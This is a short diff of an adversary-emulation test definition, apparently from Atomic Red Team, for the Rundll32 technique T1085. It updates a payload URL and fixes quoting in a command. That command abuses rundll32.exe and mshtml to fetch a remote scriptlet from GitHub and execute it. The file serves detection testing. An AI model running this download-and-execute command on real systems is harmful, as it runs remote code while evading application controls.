@@ -11,12 +11,12 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
   executor:
     name: command_prompt
     elevation_required: false
     command: |
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
 - name: Rundll32 execute VBscript command
   description: |
